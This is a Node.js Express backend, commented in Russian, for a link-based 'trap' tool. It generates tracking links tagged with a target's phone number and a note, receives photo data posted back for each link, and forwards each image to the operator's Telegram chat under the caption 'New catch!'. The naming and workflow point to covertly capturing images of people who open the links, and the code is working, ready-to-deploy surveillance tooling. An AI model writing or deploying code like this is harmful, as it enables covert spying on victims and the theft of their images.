const express = require('express');
const { Pool } = require('pg');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid'); // Установи `npm install uuid`

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(cors());

// Подключение к PostgreSQL на Neon
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: {
        rejectUnauthorized: false
    }
});

// Инициализация Telegram бота
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);

// Функция для создания таблицы, если ее нет
const createTable = async () => {
    const query = `
    CREATE TABLE IF NOT EXISTS links (
        id UUID PRIMARY KEY,
        phone_number VARCHAR(255),
        comment TEXT,
        chat_id VARCHAR(255) NOT NULL,
		created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );`;
    await pool.query(query);
};
createTable();

// Эндпоинт для генерации ссылки
app.post('/api/generate', async (req, res) => {
    const { phone, comment, chatId, domain } = req.body;
    if (!chatId || !domain) {
        return res.status(400).json({ error: 'chatId and domain are required' });
    }
    const id = uuidv4();
    await pool.query(
        'INSERT INTO links (id, phone_number, comment, chat_id) VALUES ($1, $2, $3, $4)',
        [id, phone, comment, chatId]
    );
    const generatedLink = `https://${domain}/trap/${id}`;
    res.json({ link: generatedLink });
});

// Эндпоинт для приема фото
app.post('/api/upload', async (req, res) => {
    const { id, imageData } = req.body;
    if (!id || !imageData) {
        return res.status(400).send('Missing data');
    }

    try {
        const result = await pool.query('SELECT * FROM links WHERE id = $1', [id]);
        if (result.rows.length === 0) {
            return res.status(404).send('Link not found');
        }

        const linkData = result.rows[0];
        const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");
        const imageBuffer = Buffer.from(base64Data, 'base64');

        const caption = `
        📸 **Новый улов!** 📸
        ---
        📞 **Телефон:** \`${linkData.phone_number || 'Не указан'}\`
        📝 **Комментарий:** \`${linkData.comment || 'Нет'}\`
        ---
        *ID ссылки: ${linkData.id}*
        `;

        await bot.sendPhoto(linkData.chat_id, imageBuffer, { caption: caption, parse_mode: 'Markdown' });

        res.status(200).send('OK');
    } catch (error) {
        console.error(error);
        res.status(500).send('Server error');
    }
});

module.exports = app;